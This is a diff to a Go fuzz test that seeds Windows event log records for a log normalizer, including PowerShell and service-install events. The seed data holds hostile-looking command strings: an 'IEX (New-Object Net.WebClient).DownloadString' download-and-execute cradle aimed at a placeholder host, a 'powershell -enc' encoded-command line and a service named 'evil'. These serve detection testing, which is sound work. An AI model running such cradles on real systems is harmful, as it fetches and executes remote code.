@@ -142,6 +142,10 @@ var windowsSeeds = []map[string]any{
 	{"Channel": "Microsoft-Windows-PowerShell/Operational", "Computer": "WS1", "EventID": "4104",
 		"StringInserts": []string{"2", "3", "IEX (New-Object Net.WebClient).DownloadString('http://x')", "{5d1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}", ""}},
 	WinEventRecord(SystemChannel, "7045", "WS1", now, map[string]string{"ServiceName": "evil", "ImagePath": `C:\evil.exe`}),
+	{"Channel": "Microsoft-Windows-PowerShell/Operational", "Computer": "WS1", "EventID": "4103",
+		"StringInserts": []string{"        Host Application = powershell.exe -nop\r\n        User = CORP\\bob\r\n", "", "CommandInvocation(Get-Process): \"Get-Process\""}},
+	{"Channel": "Windows PowerShell", "Computer": "WS1", "EventID": "400",
+		"StringInserts": []string{"Available", "None", "\tNewEngineState=Available\r\n\tHostApplication=powershell -enc AAA\r\n\tEngineVersion=2.0"}},
 }
 
 func FuzzNormalizeWindows(f *testing.F) {
